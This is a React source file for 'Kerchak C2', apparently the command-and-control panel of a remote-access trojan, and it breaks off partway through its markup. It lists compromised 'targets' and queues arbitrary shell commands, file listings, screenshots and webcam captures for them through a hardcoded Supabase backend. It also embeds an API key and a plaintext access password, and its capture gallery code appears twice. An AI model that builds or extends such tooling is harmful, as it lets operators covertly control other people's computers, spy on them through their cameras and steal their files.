"use client";

import { useEffect, useState, useRef } from 'react';
import { createClient } from '@supabase/supabase-js';
import { 
  Terminal, Shield, Monitor, Cpu, Globe, Activity, Settings, 
  Search, HardDrive, Layout, Command, Image as ImageIcon, Video, 
  Folder, FileText, ChevronRight, Download, Upload, X, RefreshCw, 
  Trash2, Plus, Star, Palette, Maximize2, MousePointer2, Camera,
  Layers, Lock, Unlock, Eye, Ghost, Zap, Server, Database, 
  Wifi, Cpu as CpuIcon, MemoryStick, AlertTriangle, CheckCircle2,
  ChevronDown, User, LogOut, MoreVertical, Smartphone, Key
} from 'lucide-react';

// --- CONFIG ---
const supabase = createClient(
  "https://erowwdiqlooseyvenesd.supabase.co",
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVyb3d3ZGlxbG9vc2V5dmVuZXNkIiwicm9sZSI6ImVyb3d3ZGlxbG9vc2V5dmVuZXNkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg3MDAzMjEsImV4cCI6MjA5NDI3NjMyMX0.338eEhJ_sTlZ99VqZ7HZ15eUy5DahA6lnSdBX15BTrc"
);

export default function KerchakC2() {
  const [auth, setAuth] = useState(false);
  const [pass, setPass] = useState("");
  const [pcs, setPcs] = useState<any[]>([]);
  const [selectedPc, setSelectedPc] = useState<string | null>(null);
  const [selectedPcName, setSelectedPcName] = useState<string | null>(null);
  const [activeModal, setActiveModal] = useState<'cmd' | 'explorer' | 'screenshot' | 'webcam' | 'stream' | 'shortcuts' | 'settings' | 'info' | null>(null);
  const [accentColor, setAccentColor] = useState('#ff0000');
  
  // Terminal State
  const [cmdInput, setCmdInput] = useState('');
  const [cmdHistory, setCmdHistory] = useState<string[]>([]);
  
  // Explorer State
  const [explorerPath, setExplorerPath] = useState("C:\\");
  const [explorerFiles, setExplorerFiles] = useState<any[]>([]);
  const [isExplorerLoading, setIsExplorerLoading] = useState(false);
  
  // Media State
  const [mediaItems, setMediaItems] = useState<any[]>([]);
  const [isCapturing, setIsCapturing] = useState(false);
  const [zoomedMedia, setZoomedMedia] = useState<string | null>(null);

  // Saved Commands
  const [savedCmds, setSavedCmds] = useState<any[]>([]);
  const [isAddingShortcut, setIsAddingShortcut] = useState(false);

  useEffect(() => {
    fetchPcs();
    fetchShortcuts();
    const sub = supabase.channel('pcs').on('postgres_changes' as any, { event: '*', schema: 'public', table: 'computers' }, fetchPcs).subscribe();
    return () => { supabase.removeChannel(sub); };
  }, []);

  const fetchPcs = async () => {
    const { data } = await supabase.from('computers').select('*').order('last_seen', { ascending: false });
    if (data) setPcs(data);
  };

  const fetchShortcuts = async () => {
    const { data } = await supabase.from('saved_commands').select('*');
    if (data) setSavedCmds(data);
  };

  const deletePc = async (id: string) => {
    if (!window.confirm("Permanently delete this endpoint from hive?")) return;
    await supabase.from('computers').delete().eq('id', id);
    fetchPcs();
  };

  const sendCommand = async (pcId: string, type: string, args: string = "") => {
    const { data } = await supabase.from('commands').insert({ computer_id: pcId, command: type, args, status: 'pending' }).select().single();
    if (type === 'ss' || type === 'webcam') {
      setIsCapturing(true);
      setMediaItems([]);
      setActiveModal(type === 'ss' ? 'screenshot' : 'webcam');
      const check = setInterval(async () => {
        const { data: res } = await supabase.from('commands').select('result, status').eq('id', data.id).single();
        if (res?.status === 'executed' && res.result) {
          setMediaItems(res.result.split('|'));
          setIsCapturing(false);
          clearInterval(check);
        }
      }, 2000);
      setTimeout(() => { clearInterval(check); setIsCapturing(false); }, 30000);
    }
    return data;
  };

  const fetchFiles = async (path: string) => {
    if (!selectedPc) return;
    setIsExplorerLoading(true);
    setExplorerPath(path);
    const { data } = await supabase.from('commands').insert({ computer_id: selectedPc, command: 'ls', args: path, status: 'pending' }).select().single();
    if (data) {
      const check = setInterval(async () => {
        const { data: res } = await supabase.from('commands').select('result, status').eq('id', data.id).single();
        if (res?.status === 'executed' && res.result) {
          try { 
            const raw = JSON.parse(res.result);
            setExplorerFiles(raw.map((f: any) => ({ name: f.n, isDir: f.d === 1, size: f.s }))); 
          } catch(e) {}
          setIsExplorerLoading(false);
          clearInterval(check);
        }
      }, 1000);
      setTimeout(() => { clearInterval(check); setIsExplorerLoading(false); }, 15000);
    }
  };

  if (!auth) {
    return (
      <div className="min-h-screen bg-[#050505] flex items-center justify-center p-4 font-mono overflow-hidden">
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(255,0,0,0.05),transparent)] pointer-events-none"></div>
        <div className="w-full max-w-md bg-[#0a0a0a] border border-white/10 rounded-2xl p-8 shadow-[0_0_50px_rgba(255,0,0,0.1)] relative z-10 text-center animate-in fade-in zoom-in duration-500">
          <div className="w-20 h-20 bg-red-600/20 rounded-full flex items-center justify-center mx-auto mb-6 border border-red-500/30">
            <Ghost className="text-red-500" size={40} />
          </div>
          <h1 className="text-2xl font-black text-white tracking-tighter mb-2 italic">KERCHAK <span className="text-red-600">ENGINE</span></h1>
          <p className="text-gray-500 text-xs mb-8 uppercase tracking-[0.2em] font-bold">Encrypted Command & Control</p>
          <input 
            type="password" 
            placeholder="ACCESS KEY" 
            className="w-full bg-black/50 border border-white/10 rounded-xl px-5 py-4 text-white focus:outline-none focus:border-red-600 transition-all text-center tracking-widest mb-4"
            value={pass}
            onChange={e => setPass(e.target.value)}
            onKeyDown={e => e.key === 'Enter' && pass === 'clack45' && setAuth(true)}
          />
          <button 
            onClick={() => pass === 'clack45' && setAuth(true)}
            className="w-full bg-red-600 hover:bg-red-500 text-white font-black py-4 rounded-xl transition-all shadow-[0_0_20px_rgba(220,38,38,0.3)] active:scale-95"
          >
            INITIALIZE SESSION
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050505] text-gray-300 font-sans selection:bg-red-600/30" style={{'--primary': accentColor, '--primary-glow': accentColor + '33'} as any}>
      <style dangerouslySetInnerHTML={{ __html: `
        :root { --primary: ${accentColor}; --primary-glow: ${accentColor}33; }
        .glow-red { filter: drop-shadow(0 0 10px var(--primary-glow)); }
        .border-glow:hover { border-color: var(--primary); box-shadow: 0 0 15px var(--primary-glow); }
        .bg-gradient-premium { background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, transparent 100%); }
      `}} />

      {/* TOP NAV OVERHAUL */}
      <nav className="h-20 bg-[#080808]/90 backdrop-blur-2xl border-b border-white/5 flex items-center justify-between px-8 sticky top-0 z-[100] shadow-2xl">
        <div className="flex items-center gap-10">
          <div className="flex items-center gap-4 cursor-pointer group" onClick={() => window.location.reload()}>
            <div className="w-12 h-12 bg-primary rounded-2xl flex items-center justify-center rotate-3 group-hover:rotate-0 transition-all shadow-[0_0_25px_var(--primary-glow)] border border-white/10">
              <Ghost className="text-white" size={28} />
            </div>
            <div>
              <h1 className="text-2xl font-black text-white tracking-tighter italic leading-none">KERCHAK <span className="text-primary tracking-normal not-italic font-bold text-lg">C2</span></h1>
              <div className="flex items-center gap-2 text-[10px] text-gray-500 font-bold uppercase tracking-widest mt-1">
                <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
                Hive Operational
              </div>
            </div>
          </div>
          
          <div className="hidden lg:flex items-center gap-8">
            <div className="flex flex-col">
              <span className="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Active Targets</span>
              <span className="text-lg font-black text-white leading-none">{pcs.length}</span>
            </div>
            <div className="w-px h-8 bg-white/5"></div>
            <div className="flex flex-col">
              <span className="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Global Status</span>
              <span className="text-lg font-black text-green-500 leading-none">STEALTH</span>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-5">
          <div className="hidden md:flex items-center gap-2 bg-white/5 border border-white/5 px-4 py-2.5 rounded-2xl focus-within:border-primary transition-all group">
            <Search size={16} className="text-gray-500 group-focus-within:text-primary" />
            <input type="text" placeholder="Search Endpoint..." className="bg-transparent text-xs font-bold focus:outline-none w-48 placeholder:text-gray-600" />
          </div>
          
          <div className="flex items-center gap-3">
            <button onClick={() => setActiveModal('shortcuts')} className="p-3 bg-white/5 hover:bg-white/10 rounded-2xl border border-white/5 transition-all text-gray-400 hover:text-primary"><Command size={20} /></button>
            <button onClick={() => setActiveModal('settings')} className="p-3 bg-white/5 hover:bg-white/10 rounded-2xl border border-white/5 transition-all text-gray-400 hover:text-primary"><Palette size={20} /></button>
            <div className="w-px h-8 bg-white/5 mx-1"></div>
            <div className="flex items-center gap-4 bg-white/5 border border-white/5 pl-4 pr-2 py-2 rounded-2xl group hover:border-primary/30 transition-all cursor-pointer">
              <div className="text-right">
                <p className="text-[10px] font-black text-primary uppercase leading-none mb-1">Root Admin</p>
                <p className="text-xs text-white font-bold leading-none">clack45</p>
              </div>
              <div className="w-9 h-9 bg-primary/20 rounded-xl flex items-center justify-center text-primary border border-primary/20 group-hover:bg-primary group-hover:text-white transition-all shadow-lg">
                <User size={20} />
              </div>
            </div>
          </div>
        </div>
      </nav>

      <main className="p-8 max-w-[1700px] mx-auto animate-slide-up">
        {/* STATS STRIP */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 mb-12">
          {[
            { label: 'Targets', val: pcs.length, icon: Server, color: 'text-primary' },
            { label: 'Inbound', val: '0.8 MB/s', icon: Wifi, color: 'text-blue-500' },
            { label: 'CPU Load', val: '4%', icon: CpuIcon, color: 'text-purple-500' },
            { label: 'RAM Usage', val: '1.2 GB', icon: MemoryStick, color: 'text-orange-500' },
          ].map((s, i) => (
            <div key={i} className="glass p-6 rounded-3xl border-white/5 flex items-center justify-between group hover:border-primary/20 transition-all cursor-default">
              <div>
                <p className="text-[10px] font-bold text-gray-500 uppercase tracking-widest mb-1">{s.label}</p>
                <p className="text-2xl font-black text-white">{s.val}</p>
              </div>
              <div className={`${s.color} bg-white/5 p-4 rounded-2xl group-hover:scale-110 group-hover:rotate-3 transition-all`}><s.icon size={28} /></div>
            </div>
          ))}
        </div>

        <div className="flex items-center justify-between mb-8">
          <h2 className="text-2xl font-black text-white italic tracking-tighter">DISCOVERED <span className="text-primary">ENDPOINTS</span></h2>
          <div className="flex items-center gap-3">
             <div className="flex bg-white/5 p-1 rounded-xl border border-white/5">
                <button className="px-4 py-1.5 text-[10px] font-black rounded-lg bg-primary text-white shadow-lg">ALL</button>
                <button className="px-4 py-1.5 text-[10px] font-black rounded-lg text-gray-500 hover:text-white transition-all">WINDOWS</button>
                <button className="px-4 py-1.5 text-[10px] font-black rounded-lg text-gray-500 hover:text-white transition-all">LINUX</button>
             </div>
          </div>
        </div>

        {/* TARGET CARDS OVERHAUL */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
          {pcs.map(pc => {
            const isOnline = (Date.now() - new Date(pc.last_seen).getTime()) < 15000;
            return (
              <div key={pc.id} className="glass rounded-3xl border-white/5 hover:border-primary/30 transition-all group relative overflow-hidden flex flex-col h-full animate-in zoom-in duration-300">
                <div className={`absolute top-0 inset-x-0 h-1 ${isOnline ? 'bg-green-500 shadow-[0_0_10px_#22c55e]' : 'bg-red-600 shadow-[0_0_10px_#dc2626] animate-pulse'}`}></div>
                <div className="p-6 pb-4">
                  <div className="flex justify-between items-start mb-6">
                    <div className={`w-16 h-16 rounded-2xl flex items-center justify-center bg-white/5 border border-white/5 group-hover:border-primary/20 transition-all ${isOnline ? 'text-primary' : 'text-gray-600'} shadow-inner`}>
                      <Monitor size={36} className="glow-red" />
                    </div>
                    <div className="text-right">
                       <span className={`text-[9px] font-black px-2 py-1 rounded-md border ${isOnline ? 'bg-green-500/10 text-green-400 border-green-500/20' : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>
                         {isOnline ? 'STATUS: ACTIVE' : 'STATUS: OFFLINE'}
                       </span>
                       <p className="text-[11px] font-mono font-bold text-gray-600 mt-2">{pc.ip}</p>
                    </div>
                  </div>

                  <h3 className="text-xl font-black text-white truncate mb-1 group-hover:text-primary transition-colors">{pc.name}</h3>
                  <div className="flex items-center gap-4 mt-4">
                    <div className="flex items-center gap-1.5 text-[10px] font-bold text-gray-500">
                      <Cpu size={14} className="text-primary" /> CPU: 4%
                    </div>
                    <div className="flex items-center gap-1.5 text-[10px] font-bold text-gray-500">
                      <Database size={14} className="text-blue-400" /> RAM: 1.2GB
                    </div>
                  </div>
                </div>

                <div className="mt-auto p-6 pt-0">
                  <div className="grid grid-cols-4 gap-3">
                    {[
                      { icon: Terminal, modal: 'cmd', color: 'hover:bg-primary' },
                      { icon: Folder, modal: 'explorer', color: 'hover:bg-blue-600' },
                      { icon: ImageIcon, modal: 'screenshot', color: 'hover:bg-purple-600' },
                      { icon: Video, modal: 'stream', color: 'hover:bg-orange-600' },
                    ].map((btn, i) => (
                      <button 
                        key={i} 
                        onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.name); setActiveModal(btn.modal as any); if(btn.modal==='explorer') fetchFiles('C:\\'); }}
                        className={`h-12 bg-white/5 border border-white/5 rounded-2xl flex items-center justify-center text-gray-500 ${btn.color} hover:text-white transition-all active:scale-90 shadow-md group/btn`}
                      >
                        <btn.icon size={22} />
                      </button>
                    ))}
                  </div>
                  <div className="mt-4 flex gap-2">
                    <button onClick={() => deletePc(pc.id)} className="flex-1 h-9 bg-white/5 hover:bg-red-950 hover:text-red-500 border border-white/5 rounded-xl text-[9px] font-black uppercase transition-all flex items-center justify-center gap-2"><Trash2 size={12}/> Kill Target</button>
                    <button className="w-9 h-9 bg-white/5 hover:bg-primary hover:text-white border border-white/5 rounded-xl transition-all flex items-center justify-center"><MoreVertical size={16}/></button>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      </main>

      {/* UNIFIED MODAL SYSTEM */}
      {activeModal && (
        <div className="fixed inset-0 z-[1000] flex items-center justify-center p-6 animate-in fade-in duration-300">
          <div className="absolute inset-0 bg-black/90 backdrop-blur-xl" onClick={() => setActiveModal(null)}></div>
          
          <div className="w-full max-w-6xl bg-[#0c0c0c] border border-white/10 rounded-[2.5rem] shadow-[0_0_80px_var(--primary-glow)] relative z-10 flex flex-col h-[85vh] overflow-hidden animate-in slide-in-from-bottom-12 duration-500">
            {/* MODAL HEADER */}
            <div className="flex items-center justify-between px-10 py-6 border-b border-white/5 bg-gradient-premium">
              <div className="flex items-center gap-5">
                <div className="w-14 h-14 bg-primary rounded-2xl text-white flex items-center justify-center shadow-lg border border-white/10 rotate-3">
                  {activeModal === 'cmd' && <Terminal size={28} />}
                  {activeModal === 'explorer' && <Folder size={28} />}
                  {activeModal === 'screenshot' && <ImageIcon size={28} />}
                  {activeModal === 'stream' && <Video size={28} />}
                  {activeModal === 'settings' && <Palette size={28} />}
                  {activeModal === 'shortcuts' && <Command size={28} />}
                </div>
                <div>
                  <h3 className="text-2xl font-black text-white italic uppercase tracking-tighter leading-none">
                    {activeModal} <span className="text-primary">SESSION</span>
                  </h3>
                  <div className="flex items-center gap-3 mt-1">
                    <span className="text-[10px] text-gray-500 font-bold uppercase tracking-widest flex items-center gap-1.5"><Monitor size={10} /> {selectedPcName || 'HIVE CONTROL'}</span>
                    <span className="w-1 h-1 bg-gray-700 rounded-full"></span>
                    <span className="text-[10px] text-gray-500 font-bold uppercase tracking-widest flex items-center gap-1.5"><Key size={10} /> {selectedPc || 'ADMIN'}</span>
                  </div>
                </div>
              </div>
              <div className="flex items-center gap-3">
                 <button onClick={() => setActiveModal(null)} className="w-12 h-12 flex items-center justify-center bg-white/5 hover:bg-white/10 rounded-2xl text-gray-500 hover:text-white transition-all"><X size={28} /></button>
              </div>
            </div>

            {/* MODAL BODY */}
            <div className="flex-1 flex flex-col overflow-hidden relative">
              {activeModal === 'cmd' && (
                <div className="flex-1 flex flex-col bg-black font-mono">
                  <div className="flex-1 p-8 overflow-y-auto custom-scrollbar text-sm space-y-2">
                    <div className="flex items-center gap-3 mb-6 p-4 bg-primary/5 border border-primary/10 rounded-2xl">
                       <Shield className="text-primary" size={16} />
                       <span className="text-[10px] font-black text-primary uppercase tracking-widest">Secure Tunnel Established. End-to-end encryption active.</span>
                    </div>
                    {cmdHistory.map((line, i) => (
                      <div key={i} className="animate-in fade-in slide-in-from-left-2 duration-300">
                        {line.startsWith('>') ? (
                          <div className="flex gap-3 text-primary font-black"><span className="opacity-50">$</span> {line.substring(2)}</div>
                        ) : (
                          <div className="text-gray-400 pl-6 leading-relaxed whitespace-pre-wrap">{line}</div>
                        )}
                      </div>
                    ))}
                  </div>
                  <div className="p-8 pt-0">
                    <div className="flex gap-4 items-center bg-white/5 p-5 rounded-3xl border border-white/10 shadow-2xl focus-within:border-primary transition-all">
                      <span className="text-primary font-black text-xl">#</span>
                      <input 
                        type="text" 
                        className="bg-transparent flex-1 focus:outline-none text-white font-bold text-sm"
                        placeholder="INPUT SYSTEM COMMAND..."
                        value={cmdInput}
                        onChange={e => setCmdInput(e.target.value)}
                        onKeyDown={e => {
                          if (e.key === 'Enter' && cmdInput.trim()) {
                            setCmdHistory([...cmdHistory, '> ' + cmdInput]);
                            sendCommand(selectedPc!, 'shell', cmdInput);
                            setCmdInput('');
                          }
                        }}
                      />
                      <button className="p-3 bg-primary rounded-xl text-white shadow-lg"><MousePointer2 size={18} /></button>
                    </div>
                  </div>
                </div>
              )}

              {(activeModal === 'screenshot' || activeModal === 'webcam') && (
                <div className="flex-1 flex flex-col overflow-hidden bg-black/40">
                  <div className="p-8 border-b border-white/5 flex justify-between items-center bg-white/5">
                    <div className="flex items-center gap-4">
                      <div className="p-3 bg-primary/20 rounded-xl text-primary border border-primary/20">
                         {activeModal === 'screenshot' ? <Monitor size={24} /> : <Camera size={24} />}
                      </div>
                      <div>
                        <h4 className="text-xl font-black text-white italic tracking-tighter uppercase">{activeModal} <span className="text-primary">GALLERY</span></h4>
                        <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Captured from Hive Node: {selectedPcName}</p>
                      </div>
                    </div>
                    <button 
                      onClick={() => sendCommand(selectedPc!, activeModal === 'screenshot' ? 'ss' : 'webcam')} 
                      className={`px-6 py-3 bg-primary hover:bg-primary/80 rounded-2xl text-white text-[10px] font-black uppercase flex items-center gap-2 shadow-lg transition-all active:scale-95 ${isCapturing ? 'opacity-50 pointer-events-none' : ''}`}
                    >
                      <RefreshCw size={16} className={isCapturing ? 'animate-spin' : ''} /> {isCapturing ? 'CAPTURING...' : 'NEW CAPTURE'}
                    </button>
                  </div>
                  <div className="flex-1 overflow-y-auto p-10 custom-scrollbar">
                    {isCapturing && mediaItems.length === 0 ? (
                      <div className="flex flex-col items-center justify-center h-full gap-5">
                         <div className="relative">
                            <div className="w-20 h-20 border-4 border-primary/20 border-t-primary rounded-full animate-spin"></div>
                            <div className="absolute inset-0 flex items-center justify-center"><Activity size={24} className="text-primary animate-pulse" /></div>
                         </div>
                         <span className="text-xs font-black uppercase tracking-[0.3em] text-primary animate-pulse">Requesting Hardware Access...</span>
                      </div>
                    ) : mediaItems.length > 0 ? (
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                        {mediaItems.map((url, i) => (
                          <div key={i} className="group relative glass rounded-3xl overflow-hidden border-white/5 hover:border-primary/40 transition-all shadow-2xl">
                             <div className="absolute top-4 left-4 z-10 px-3 py-1 bg-black/60 backdrop-blur-md rounded-lg text-[9px] font-black text-white border border-white/10 uppercase tracking-widest">
                                {activeModal === 'screenshot' ? `MONITOR ${i + 1}` : `WEBCAM ${i + 1}`}
                             </div>
                             <div className="aspect-video bg-black flex items-center justify-center overflow-hidden cursor-zoom-in" onClick={() => setZoomedMedia(`https://erowwdiqlooseyvenesd.supabase.co/storage/v1/object/public/kerchak-assets/${url}`)}>
                                <img 
                                  src={`https://erowwdiqlooseyvenesd.supabase.co/storage/v1/object/public/kerchak-assets/${url}`} 
                                  alt="Remote Capture" 
                                  className="w-full h-full object-contain group-hover:scale-105 transition-transform duration-700"
                                />
                             </div>
                             <div className="p-4 bg-white/5 flex justify-between items-center">
                                <span className="text-[10px] font-mono text-gray-500 uppercase">{url.split('_').pop()}</span>
                                <button className="p-2 hover:bg-primary/20 rounded-lg text-gray-400 hover:text-primary transition-all"><Download size={16} /></button>
                             </div>
                          </div>
                        ))}
                      </div>
                    ) : (
                      <div className="flex flex-col items-center justify-center h-full gap-4 text-gray-700">
                        <ImageIcon size={64} className="opacity-10" />
                        <span className="text-xs font-bold uppercase tracking-widest">No captures available in this session.</span>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {(activeModal === 'screenshot' || activeModal === 'webcam') && (
                <div className="flex-1 flex flex-col overflow-hidden bg-black/40 animate-in fade-in duration-500">
                  <div className="p-10 border-b border-white/5 flex justify-between items-center bg-white/5 relative overflow-hidden">
                    <div className="absolute inset-0 bg-gradient-to-r from-primary/5 to-transparent pointer-events-none"></div>
                    <div className="flex items-center gap-6 relative z-10">
                      <div className="w-16 h-16 bg-primary/20 rounded-[1.5rem] text-primary flex items-center justify-center border border-primary/20 shadow-[0_0_20px_var(--primary-glow)]">
                         {activeModal === 'screenshot' ? <Monitor size={32} /> : <Camera size={32} />}
                      </div>
                      <div>
                        <h4 className="text-3xl font-black text-white italic tracking-tighter uppercase leading-none">{activeModal} <span className="text-primary">GALLERY</span></h4>
                        <p className="text-[10px] text-gray-500 font-bold uppercase tracking-[0.3em] mt-2">Captured from hive node: {selectedPcName}</p>
                      </div>
                    </div>
                    <button 
                      onClick={() => sendCommand(selectedPc!, activeModal === 'screenshot' ? 'ss' : 'webcam')} 
                      className={`px-8 py-4 bg-primary hover:bg-primary/80 rounded-2xl text-white text-xs font-black uppercase flex items-center gap-3 shadow-2xl transition-all active:scale-95 ${isCapturing ? 'opacity-50 pointer-events-none' : ''}`}
                    >
                      <RefreshCw size={18} className={isCapturing ? 'animate-spin' : ''} /> {isCapturing ? 'ACQUIRING...' : 'NEW SESSION'}
                    </button>
                  </div>
                  <div className="flex-1 overflow-y-auto p-10 custom-scrollbar">
                    {isCapturing && mediaItems.length === 0 ? (
                      <div className="flex flex-col items-center justify-center h-full gap-8">
                         <div className="relative">
                            <div className="w-24 h-24 border-[6px] border-primary/10 border-t-primary rounded-full animate-spin"></div>
                            <div className="absolute inset-0 flex items-center justify-center"><Activity size={32} className="text-primary animate-pulse" /></div>
                         </div>
                         <div className="text-center">
                            <span className="text-sm font-black uppercase tracking-[0.4em] text-primary animate-pulse block">Accessing Peripheral Hardware...</span>
                            <span className="text-[10px] font-bold text-gray-600 uppercase tracking-widest mt-2 block">Bypassing localized security layers...</span>
                         </div>
                      </div>
                    ) : mediaItems.length > 0 ? (
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-10">
                        {mediaItems.map((url, i) => (
                          <div key={url + i} className="group relative glass rounded-[2.5rem] overflow-hidden border-white/5 hover:border-primary/40 transition-all shadow-[0_20px_50px_rgba(0,0,0,0.5)]">
                             <div className="absolute top-6 left-6 z-10 px-4 py-1.5 bg-black/70 backdrop-blur-xl rounded-xl text-[10px] font-black text-white border border-white/10 uppercase tracking-[0.2em] shadow-xl">
                                {activeModal === 'screenshot' ? `MONITOR_${i + 1}` : `CAMERA_FEED_${i + 1}`}
                             </div>
                             <div className="aspect-video bg-black/40 flex items-center justify-center overflow-hidden cursor-zoom-in" onClick={() => setZoomedMedia(`https://erowwdiqlooseyvenesd.supabase.co/storage/v1/object/public/kerchak-assets/${url}`)}>
                                <img 
                                  src={`https://erowwdiqlooseyvenesd.supabase.co/storage/v1/object/public/kerchak-assets/${url}`} 
                                  alt="Remote Hardware Capture" 
                                  className="w-full h-full object-contain group-hover:scale-110 transition-all duration-1000 ease-out"
                                />
                                <div className="absolute inset-0 bg-primary/10 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
                                   <Maximize2 size={48} className="text-white drop-shadow-2xl translate-y-4 group-hover:translate-y-0 transition-all duration-500" />
                                </div>
                             </div>
                             <div className="p-6 bg-white/5 border-t border-white/5 flex justify-between items-center">
                                <div className="flex flex-col">
                                   <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Capture ID</span>
                                   <span className="text-xs font-mono font-bold text-white opacity-50">{url.substring(0, 12)}...</span>
                                </div>
                                <div className="flex gap-3">
                                   <button className="w-11 h-11 bg-white/5 hover:bg-primary/20 rounded-xl text-gray-500 hover:text-primary transition-all flex items-center justify-center"><Download size={20} /></button>
                                   <button className="w-11 h-11 bg-white/5 hover:bg-red-600/20 rounded-xl text-gray-500 hover:text-red-500 transition-all flex items-center justify-center"><Trash2 size={20} /></button>
                                </div>
                             </div>
                          </div>
                        ))}
                      </div>
                    ) : (
                      <div className="flex flex-col items-center justify-center h-full gap-6 text-gray-800">
                        <div className="w-24 h-24 bg-white/5 rounded-[2rem] flex items-center justify-center border border-white/5">
                           <ImageIcon size={48} className="opacity-10" />
                        </div>
                        <span className="text-xs font-black uppercase tracking-[0.3em] opacity-30">No intelligence gathered in current session.</span>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {activeModal === 'settings' && (
                <div className="flex-1 p-10 overflow-y-auto custom-scrollbar bg-black/40">
                  <h4 className="text-3xl font-black text-white italic tracking-tighter mb-10">SYSTEM <span className="text-primary">OVERRIDE</span></h4>
                  <div className="max-w-2xl space-y-10">
                     <section>
                        <h5 className="text-xs font-black text-gray-500 uppercase tracking-widest mb-6 flex items-center gap-3"><Palette size={16} /> Dashboard Identity</h5>
                        <div className="flex flex-wrap gap-4">
                           {['#ff0000', '#22c55e', '#3b82f6', '#a855f7', '#eab308', '#ec4899', '#06b6d4', '#f97316'].map(color => (
                              <button 
                                key={color} 
                                onClick={() => setAccentColor(color)}
                                className={`w-14 h-14 rounded-2xl border-4 transition-all hover:scale-110 shadow-lg ${accentColor === color ? 'border-white' : 'border-white/5'}`}
                                style={{ backgroundColor: color }}
                              />
                           ))}
                        </div>
                     </section>
                     
                     <section>
                        <h5 className="text-xs font-black text-gray-500 uppercase tracking-widest mb-6 flex items-center gap-3"><Settings size={16} /> Hive Configuration</h5>
                        <div className="grid grid-cols-2 gap-6">
                           <div className="space-y-2">
                              <label className="text-[10px] font-bold text-gray-600 uppercase tracking-widest ml-1">Communication Protocol</label>
                              <div className="bg-black border border-white/10 rounded-2xl p-4 text-xs font-bold text-white flex justify-between items-center cursor-pointer hover:border-primary/50 transition-all">
                                 SECURE_HTTPS_V2
                                 <ChevronDown size={14} className="text-primary" />
                              </div>
                           </div>
                           <div className="space-y-2">
                              <label className="text-[10px] font-bold text-gray-600 uppercase tracking-widest ml-1">Polling Interval</label>
                              <div className="bg-black border border-white/10 rounded-2xl p-4 text-xs font-bold text-white flex justify-between items-center cursor-pointer hover:border-primary/50 transition-all">
                                 1.0 SEC (AGGRESSIVE)
                                 <ChevronDown size={14} className="text-primary" />
                              </div>
                           </div>
                        </div>
                     </section>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* SHORTCUT REGISTER POPUP OVERHAUL */}
      {isAddingShortcut && (
        <div className="fixed inset-0 z-[2000] flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-black/80 backdrop-blur-md" onClick={() => setIsAddingShortcut(false)}></div>
          <div className="w-full max-w-lg bg-[#111] border border-white/10 rounded-[2.5rem] p-10 relative z-10 shadow-[0_0_100px_rgba(0,0,0,0.5)] animate-in zoom-in duration-300">
            <h4 className="text-2xl font-black text-white italic mb-8 tracking-tighter uppercase">REGISTER <span className="text-primary">COMMAND</span></h4>
            <div className="space-y-6">
              <div>
                <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-3 block ml-1">Command Alias</label>
                <div className="bg-black border border-white/10 rounded-2xl px-5 py-4 flex items-center gap-3 focus-within:border-primary transition-all">
                   <Star size={16} className="text-gray-700" />
                   <input type="text" id="s_name" placeholder="E.g. Clear Event Logs" className="w-full bg-transparent text-sm font-bold focus:outline-none text-white" />
                </div>
              </div>
              <div className="grid grid-cols-2 gap-6">
                 <div>
                    <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-3 block ml-1">Type</label>
                    <div className="bg-black border border-white/10 rounded-2xl px-5 py-4 flex items-center gap-3 focus-within:border-primary transition-all">
                       <Zap size={16} className="text-gray-700" />
                       <input type="text" id="s_cmd" placeholder="shell, ls..." className="w-full bg-transparent text-sm font-bold focus:outline-none text-white" />
                    </div>
                 </div>
                 <div>
                    <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-3 block ml-1">Payload</label>
                    <div className="bg-black border border-white/10 rounded-2xl px-5 py-4 flex items-center gap-3 focus-within:border-primary transition-all">
                       <Database size={16} className="text-gray-700" />
                       <input type="text" id="s_args" placeholder="Arguments..." className="w-full bg-transparent text-sm font-bold focus:outline-none text-white" />
                    </div>
                 </div>
              </div>
              <div className="flex gap-4 mt-6">
                 <button onClick={() => setIsAddingShortcut(false)} className="flex-1 py-4 bg-white/5 hover:bg-white/10 rounded-2xl text-[10px] font-black uppercase text-gray-500 transition-all">Cancel</button>
                 <button 
                   onClick={async () => {
                     const n = (document.getElementById('s_name') as any).value;
                     const c = (document.getElementById('s_cmd') as any).value;
                     const a = (document.getElementById('s_args') as any).value;
                     if (n && c) {
                       await supabase.from('saved_commands').insert({ name: n, command: c, args: a });
                       fetchShortcuts();
                       setIsAddingShortcut(false);
                     }
                   }}
                   className="flex-[2] bg-primary hover:bg-primary/80 text-white font-black py-4 rounded-2xl shadow-2xl transition-all active:scale-95"
                 >
                   AUTHORIZE & SAVE
                 </button>
              </div>
            </div>
          </div>
        </div>
      )}
      {/* FULLSCREEN ZOOM OVERLAY */}
      {zoomedMedia && (
        <div className="fixed inset-0 z-[5000] flex items-center justify-center p-10 animate-in fade-in duration-300">
